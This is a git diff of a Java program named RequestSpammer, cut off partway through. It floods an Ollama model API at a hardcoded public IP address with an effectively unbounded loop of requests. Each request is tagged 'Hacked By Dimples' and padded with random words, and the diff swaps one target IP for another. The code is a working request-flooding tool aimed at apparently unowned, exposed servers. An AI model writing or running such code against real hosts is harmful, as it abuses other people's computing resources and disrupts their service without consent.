@@ -3,9 +3,6 @@ package net.deepseek;
 
 import cn.a114.utils.SoutUtils;
 import com.google.gson.*;
-import com.google.gson.stream.JsonWriter;
-import jdk.nashorn.internal.parser.JSONParser;
-import sun.font.SunFontManager;
 
 import java.io.*;
 import java.net.HttpURLConnection;
@@ -15,76 +12,92 @@ import java.util.Random;
 
 public class RequestSpammer {
 
+    // 加载单词文件的输入流
     public static InputStream WORDS_TXT_STREAM = RequestSpammer.class.getResourceAsStream("/words.txt");
 
-    public static final String BASE_URL = "http://183.6.26.100:11434/api/generate"; // Replace with your Ollama API endpoint
-    private static final int NUM_REQUESTS = Integer.MAX_VALUE; // Number of requests to send
-    private static final String MODEL_NAME = "deepseek-r1:14b";
+    // Ollama API的基础URL
+    public static final String BASE_URL = "http://47.120.73.123:11434/api/generate";
+
+    // 使用的模型名称
+    private static final String MODEL_NAME = "deepseek-r1:latest";
+
+    // 发送请求的数量
+    private static final int NUM_REQUESTS = Integer.MAX_VALUE;
+
 
     public static void main(String[] args) {
         SoutUtils.out("RequestSpammer is running");
         try {
+            // 循环发送请求，直到达到最大请求数
             for (int i = 0; i < NUM_REQUESTS; i++) {
-                String prompt = "Hacked By Dimples#" + i; // Replace with your prompt
+                // 创建请求的提示词
+                String prompt = "Hacked By Dimples#" + i;
 
-                String _randomWords = randomWords(new Random().nextInt(8), true, WORDS_TXT_STREAM);
+                // 生成随机单词
+                String randomWords = randomWords(new Random().nextInt(8), true, WORDS_TXT_STREAM);
 
+                // 指定请求是否包含不安全内容
                 boolean isUnsafe = true;
 
                 try {
-                    sendRequest(prompt, _randomWords, isUnsafe);
+                    // 发送请求
+                    sendRequest(prompt, randomWords, isUnsafe);
                     SoutUtils.out("Try to Spam");
                 } catch (OutOfMemoryError e) {
+                    // 处理内存溢出错误
                     SoutUtils.out(e.getClass().getCanonicalName());
+
+                    // 强制垃圾回收
                     System.gc();
                 }
-
-
             }
-            // Use a thread pool to execute the requests concurrently
+            // 这里可以添加使用线程池并发发送请求的代码
         } catch (Throwable e) {
+            // 捕获异常并输出错误消息
             SoutUtils.out("Error: " + e.getMessage());
         }
     }
 
-    public static synchronized String randomWords(int WordCount, boolean shouldSpace, InputStream iStream) throws IOException {
-
-        String s;
+    // 生成指定数量的随机单词
+    public static synchronized String randomWords(int wordCount, boolean shouldSpace, InputStream iStream) throws IOException {
         String words = "";
-        for (int i = 0; i <= WordCount; i++) {
-            s = readWordsFromStream(new Random().nextInt(466550), iStream);
-            words += (s + (shouldSpace ? " " : ""));
+        // 循环读取随机单词
+        for (int i = 0; i < wordCount; i++) {
+            String word = readWordsFromStream(new Random().nextInt(466550), iStream);
+            words += (word + (shouldSpace ? " " : ""));
         }
-        return words;
-
+        return words.trim(); // 返回生成的单词，去掉末尾空格
     }
 
+    // 从输入流中根据行号读取单词
     public static String readWordsFromStream(int line, InputStream stream) throws IOException {
         BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(stream));
+        String words = "";
 
-        String words;
-        synchronized ("") {
-            for (int i = 0; i <= line; i++) {
+        // 同步访问输入流，防止并发问题
+        synchronized (bufferedReader) {
+            // 跳过指定的行数
+            for (int i = 0; i < line; i++) {
                 bufferedReader.readLine();
             }
+            // 读取当前行的单词
+            words = bufferedReader.readLine();
         }
-        words = bufferedReader.readLine();
-        return words;
+        return words; // 返回读取的单词
     }
 
+    // 格式化JSON字符串
     public static String prettyPrintUsingGson(String uglyJson) {
         Gson gson = new GsonBuilder().setPrettyPrinting().create();
-
         JsonElement jsonElement = JsonParser.parseString(uglyJson);
-        String prettyJsonString = gson.toJson(jsonElement);
-        return prettyJsonString;
+        // 返回格式化后的JSON字符串
+        return gson.toJson(jsonElement);
     }
 
+    // 发送请求到Ollama API
     private static synchronized void sendRequest(String prompt, String message, boolean isUnsafe) {
         try {
             // Create the request body
-
-
             JsonObject jobj = new JsonObject();
 
 
